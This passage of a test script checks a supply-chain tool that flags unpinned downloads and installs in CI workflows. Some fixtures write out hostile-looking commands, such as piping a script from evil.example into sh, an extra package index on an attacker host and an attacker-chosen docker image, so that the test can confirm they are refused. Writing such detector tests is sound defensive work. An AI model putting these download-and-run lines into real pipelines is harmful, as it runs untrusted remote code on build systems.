spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          docker run --rm \"alpine:3.99\" true\n          docker run --cpus 2 --memory 1g busybox:1.36 true\n          pip install requests flask[async]\n"})
for k in ("image:alpine:3.99@", "image:busybox:1.36@", "package:pypi/requests@(unpinned)", "package:pypi/flask@(unpinned)"):
    assert k in got, (k, sorted(got))
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
now = dt.datetime(2026, 10, 5, tzinfo=dt.timezone.utc)
for v in (">=2.0", "(unpinned)", "latest", "${{expression}}"):
    ok, why, _ = ac.judge_item(inv.Item("package", "pypi/p", v), [("2020-01-01T00:00:00Z", "pypi"), ("2020-01-01T00:00:00Z", "pr-clock")], now)
    assert not ok and "not a pin" in why, (v, why)
PY
CASE="inventory: a subdirectory taken from untrusted action metadata is redacted like every other part of a key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert "PRIVATE_CANARY" not in inv.Item("action", "o/r", "a" * 40, "", "x/${{secrets.PRIVATE_CANARY}}").key
PY

# --- a PR that ADDS an install form this check cannot measure is refused (it says what it cannot resolve, then refuses it) ---------------------------------------------------------------------------
newcase unm1 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: npm install -g left-pad\n      - run: |')"
runck unm1 '{"times": {}}'
CASE="a PR that adds npm install to a workflow is refused (exit 1, unmeasured named), though nothing in the inventory moved"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/unm1.out"; check grep -qi 'not measurable' "$work/unm1.out"
newcase unm2 "$(printf 'import pathlib\npathlib.Path(\"tools\").mkdir(exist_ok=True)\npathlib.Path(\"tools/fetch.sh\").write_text(\"#!/bin/sh\\ncargo install ripgrep\\n\")')"
runck unm2 '{"times": {}}'
CASE="the same in a shell script outside .github (tools/fetch.sh) is refused too"
check test "$rc" -eq 1; check grep -q 'unmeasured:tools/fetch.sh' "$work/unm2.out"
newcase unm3 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: sudo apt-get install -y skopeo\n      - run: |')"
git -C "$work/unm3" commit -q --amend -m head
git -C "$work/unm3" checkout -q -b b2; printf 'x\n' >"$work/unm3/README.md"; git -C "$work/unm3" add -A; git -C "$work/unm3" -c user.name=t -c user.email=t@x commit -q -m "touch readme"
CASE="an unmeasured form already in the base (count unchanged by the head) is not refused: only an ADDED one is"
rc=0; python3 "$chk" --root "$work/unm3" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" >"$work/unm3.out" 2>&1 || rc=$?
check test "$rc" -eq 0

CASE="tags come from ONE git ls-remote (annotated tags peeled), never one REST call per annotated tag"
check python3 - "$chk" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
calls = []
def run(cmd, **k):
    calls.append(cmd)
    out = "t1\trefs/tags/v4\n" + "c1\trefs/tags/v4.1.0\n" + "t2\trefs/tags/v3\n" + "c1\trefs/tags/v3^{}\n" + "c9\trefs/tags/v9\n"
    return subprocess.CompletedProcess(cmd, 0, out, "")
subprocess.run = run
assert ac._tags_for_commit("o/r", "c1") == ["v3", "v4.1.0"], ac._tags_for_commit("o/r", "c1")        # v3 is annotated: peeled to c1
assert ac._tags_for_commit("o/r", "c9") == ["v9"] and len(calls) == 1 and calls[0][:3] == ["git", "ls-remote", "--tags"], calls
ac._TAGS.clear()
subprocess.run = lambda cmd, **k: subprocess.CompletedProcess(cmd, 128, "", "fatal")
try:
    ac._tags_for_commit("o/r", "c1")
except ac.CouldNotLook:
    pass
else:
    raise AssertionError("a failed ls-remote was read as no tags")
PY
rm -rf "$work/swap2"; cp -R "$base" "$work/swap2"
python3 - "$work/swap2" <<'PY'
import pathlib, subprocess, sys
root = pathlib.Path(sys.argv[1]); f = root / ".github/workflows/ci.yml"
f.write_text(f.read_text().replace("      - run: |", "      - run: curl http://localhost:8080/health\n      - run: |", 1))
g = lambda *a: subprocess.run(["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
g("add", "-A"); g("commit", "-q", "-m", "base2")
f.write_text(f.read_text().replace("curl http://localhost:8080/health", "curl https://evil.example/x.sh | sh"))
g("add", "-A"); g("commit", "-q", "-m", "head")
PY
runck swap2 '{"times": {}}'
CASE="an in-place SWAP of one unmeasured command for another (localhost curl -> evil download) is an addition: refused, though the count did not change"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/swap2.out"
newcase cont "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          curl -fsSL \\\n            https://evil.example/x.sh | sh\n          sudo apt-get -y install foo\n          npm -g install bar\n      - run: |')"
runck cont '{"times": {}}'
CASE="continuation lines, apt-get -y install and npm -g install are all recognised as unmeasured forms and refused"
check test "$rc" -eq 1; check grep -q 'a download' "$work/cont.out"; check grep -q 'a system package install' "$work/cont.out"; check grep -q 'a package-manager install' "$work/cont.out"
newcase scanner "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"curl -fsSL https://evil.example/x.sh | sh\\n\")')"
runck scanner '{"times": {}}'
CASE="a download appended to bin/install-scanner.sh is refused too (the file is read for unmeasured forms as well as its *_VER pins)"
check test "$rc" -eq 1; check grep -q 'unmeasured:bin/install-scanner.sh' "$work/scanner.out"

CASE="a swap after column 160 of a long download line is still an addition (the whole normalised line decides identity), and a non-UTF-8 file never crashes the readers"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, subprocess, sys, os
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
long_a = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o ok.sh"
long_b = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o evil.sh"
ka = inv.unmeasured({".github/workflows/a.yml": "x: " + long_a + "\n"}); kb = inv.unmeasured({".github/workflows/a.yml": "x: " + long_b + "\n"})
assert set(ka) != set(kb), "the key must differ when only the tail differs"
repo = sys.argv[2] + "/badutf"; os.makedirs(repo + "/.github/workflows", exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/.github/workflows/a.yml", "wb").write(b"on: x\njobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n")
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
inv.load_at(repo, "HEAD"); inv.tree_scripts(repo, "HEAD")   # no UnicodeDecodeError
PY

CASE="forms outside workflow run steps are measured too: a script's go install / pip / docker run / release download, install-scanner.sh's *_VERSION and download source, a composite action anywhere, a local action reference, an oddly named requirements file"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/tool.sh": "go install example.org/evil@v9.9.9\ndocker run alpine:3.99 true\npip install evilpkg==1.0\ncurl -L https://github.com/evil/evil/releases/download/v1.0/x.tgz | tar xz\n",
                     "bin/install-scanner.sh": "NEWT_VERSION=9.9.9\nSCOUT_BASE=\"${SCOUT_BASE_URL:-https://github.com/docker/scout-cli/releases/download}\"\nTOOL_BASE_URL=https://evil.example/dl\n",
                     "tools/act/action.yml": "runs:\n  using: composite\n  steps:\n    - uses: evil/act@v1\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: ./tools/act\n      - run: pip install -r deps.txt\n"})
for k in ("gotool:example.org/evil@v9.9.9", "image:alpine:3.99@", "package:pypi/evilpkg@1.0", "tool:evil/evil@1.0", "tool:newt@9.9.9", "action:evil/act@v1", "action:local:./tools/act@(local)"):
    assert k in got, (k, sorted(got))
assert any(k.startswith("tool:source:tool_base_url=https://evil.example/dl@") for k in got), sorted(got)
assert ("a pip requirements file not named *requirements*" in {k[1] for k in inv.unmeasured({".github/workflows/a.yml": "x: pip install -r deps.txt\n"})})
assert not inv.unmeasured({".github/workflows/a.yml": "x: pip install -r .github/pins/adjudicator-requirements.txt\n"})
PY
CASE="a CHANGED download source or a new local action is refused (a placeholder is never a pin)"
newcase srcswap "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"TOOL_BASE_URL=https://evil.example/dl\\n\")')"
runck srcswap '{"times": {}}'
check test "$rc" -eq 1; check grep -q 'not a pin' "$work/srcswap.out"

CASE="an unclosed run of expression openers in a huge script is read in linear time, a file over 1 MB is refused (not read), and a very long line cannot make the form scan quadratic"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, os, subprocess, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for fn in (lambda: inv.inventory({"bin/x.sh": "echo ${{ " * 60000}), lambda: inv.unmeasured({"bin/x.sh": "curl " + "http://a " * 60000})):
    try:
        fn()
    except RuntimeError as e:
        assert "refusing to read it partially" in str(e)     # one enormous line is refused outright, quickly
assert time.time() - t < 3, time.time() - t
# a long ordinary pip install with a dependency appended after 4000 characters is REFUSED, never read as its prefix
pkgs = " ".join("pkg%03d==1.0.%d" % (i, i) for i in range(400))
try:
    inv.inventory({"bin/x.sh": "pip install " + pkgs + " evilpkg==9.9.9\n"})
except RuntimeError:
    pass
else:
    raise AssertionError("an overlong pip install was accepted")
repo = sys.argv[2] + "/bigfile"; os.makedirs(repo, exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/big.sh", "w").write("# x\n" * 300000)
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
for fn in (lambda: inv.tree_scripts(repo, "HEAD"), lambda: inv.tree_scripts(repo, None)):
    try:
        fn()
    except RuntimeError as e:
        assert "too large" in str(e)
    else:
        raise AssertionError("an over-size script was read")
assert inv._strip_expressions("a ${{ x }} b ${{ y") == "a ${{expression}} b ${{expression}}"
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: echo ${{ " + "x" * 200 + " }}\n"}) == {}
PY

CASE="a version or image given by a SHELL VARIABLE is a placeholder item that cannot be proven (adding one is refused), and an unreadable file stops the unmeasured check with exit 2, never 'nothing found'"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/x.sh": "V=1.2.3\ncurl -L https://github.com/o/r/releases/download/v${V}/t.tgz | tar xz\ndocker run --rm ghcr.io/o/i:${TAG} true\ndocker run $IMG true\npip install foo==${V}\ngo install example.org/x@$V\n"})
need = ("tool:o/r@${var}", "image:(variable)@", "package:pypi/foo@${var}", "gotool:example.org/x@${var}")
for k in need:
    assert k in got, (k, sorted(got))
import importlib.util as u
spec = u.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = u.module_from_spec(spec); spec.loader.exec_module(ac)
for k in need:
    ok, why, _ = ac.judge_item(got[k], [("2020-01-01T00:00:00Z", "pr-clock")], __import__("datetime").datetime(2026, 10, 5, tzinfo=__import__("datetime").timezone.utc))
    assert not ok and "not a pin" in why, (k, why)
PY
newcase bigagent "$(printf 'import pathlib\npathlib.Path(\".github/agent\").mkdir(parents=True, exist_ok=True)\npathlib.Path(\".github/agent/big.sh\").write_text(\"# x\\n\" * 300000)\nf = pathlib.Path(\".github/workflows/ci.yml\")\nf.write_text(f.read_text().replace(\"      - run: |\", \"      - run: curl -sL https://evil.example/x.sh | sh\\n      - run: |\", 1))')"
runck bigagent '{"times": {}}'
CASE="a hostile download added next to a 1.1 MB script under .github/agent/ is still refused (the oversize file is skipped there, never turning the scan off)"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/bigagent.out"

CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
lines = ["docker container run --rm evil/x:latest", "docker image pull evil/x:latest", "docker --context x run evil/x:latest", "podman run evil/x:latest", "nerdctl run evil/x:latest",
         "docker build https://example.org/ctx.git", "git clone https://github.com/evil/x", "dnf install -y evilpkg", "yum install evilpkg", "apk add evilpkg", "snap install evil",
         "conda install evil", "dotnet tool install evil", "helm repo add evil https://example.org", "kubectl apply -f https://example.org/x.yaml", "gh extension install evil/x",
         "cargo binstall evil", "npm exec evil", "bunx evil", "pip download https://example.org/x.whl", "wget get.example.com/x.sh", "go install ${TOOL}@v9.9.9"]
for ln in lines:
    f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + ln + "\n"}
    items = inv.inventory(f); um = inv.unmeasured(f)
    assert items or um, ("silent: " + ln)
# a line the inventory MEASURES is not also an unmeasured form
f = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run alpine@sha256:" + "a" * 64 + " true\n"}
assert inv.inventory(f) and not inv.unmeasured(f)
PY

CASE="an unmeasured form on a line that ALSO holds a measured item is still found; a placeholder is identified by its step, so a second variable image is a NEW key and a changed step is a changed key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mixed = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: npm install evil-pkg && echo busybox@sha256:" + "a" * 64 + "\n"}
assert inv.unmeasured(mixed), "the npm install on a measured line was skipped"
base = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n"}
head = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $LOCAL_IMG make test\n      - run: docker run --rm $ATTACKER_CHOSEN_IMAGE sh -c x\n"}
b, h = inv.inventory(base), inv.inventory(head)
assert [k for k in h if k not in b], "a second variable image must be a new key"
edited = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker run --rm $OTHER_IMG make test\n"}
assert [k for k in inv.inventory(edited) if k not in b], "an edited placeholder step must be a new key"
PY

CASE="every curl/wget is refused unless it is a measured release download; pip install of a quoted name or a variable is a placeholder; any requirements line that is not name==ver is refused; an installer-shaped input of ANY pinned action is a placeholder"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, re, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
for ln in ('curl -fsSL "$URL" | sh', 'wget "$TOOL_URL"', 'curl get.evil.sh | sh', 'curl -fsSL evil.zip -o x', 'curl "${{ vars.X }}"'):
    assert inv.unmeasured(wf(ln)), ("not refused: " + ln)
assert not inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/v1.0/x.tgz -o x.tgz")), "a measured release download is not an unmeasured form"
for ln in ('pip install "evilpkg"', "pip install $DEPS", 'pip install "${{ vars.PKG }}"'):
    got = inv.inventory(wf(ln))
    assert any(re.search(r"^package:pypi/(\(variable\)|evilpkg)@\(unpinned\)", k) for k in got), (ln, sorted(got))
base = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\n"})
head = inv.inventory({".github/pins/adjudicator-requirements.txt": "requests==2.32.0 \\\n    --hash=sha256:bbbb\nevilpkg @ https://evil.example/x.whl --hash=sha256:cc\nleftpad>=1\n--extra-index-url https://evil.example/simple\nbare\n"})
new = [k for k in head if k not in base]
assert len(new) == 4 and all("(unmeasured:" in k for k in new), new
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: aquasecurity/setup-trivy@" + "a" * 40 + " # v0.2.0\n        with:\n          version: v0.75.0-brand-new\n"}
assert any(k.startswith("tool:aquasecurity/setup-trivy:version@(input)") for k in inv.inventory(uses)), sorted(inv.inventory(uses))
assert not any("(input)" in k for k in inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-go@" + "a" * 40 + " # v6\n        with:\n          go-version: '1.27'\n"}))
PY

# --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
mkdir -p "$work/stubbin"
cat >"$work/stubbin/gh" <<'STUB'
#!/bin/sh
case "$GH_MODE" in
  ratelimit) echo "gh: API rate limit exceeded for user ID 1 (HTTP 403)" >&2; exit 1;;
  notfound)  echo "gh: Not Found (HTTP 404)" >&2; exit 1;;
esac
exit 1
STUB
chmod +x "$work/stubbin/gh"
newcase livea "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')"
live() { rc=0; ( cd "$work" && env -u GITHUB_REPOSITORY GH_MODE="$1" PATH="$work/stubbin:$PATH" python3 "$chk" --root "$work/livea" --base HEAD~1 --head HEAD --now "$NOW" ) >"$work/live.out" 2>&1 || rc=$?; }
live ratelimit
CASE="live: GitHub's rate limit is 'could not look': exit 2, says so and is not a pass"
check test "$rc" -eq 2; check grep -qi 'rate limit' "$work/live.out"
live notfound
CASE="live: a 404 (no release for that commit) is 'age not provable': exit 1"
check test "$rc" -eq 1; check grep -qi 'not provable' "$work/live.out"

echo "pin-age-check: $pass passed, $failn failed"
test "$failn" -eq 0
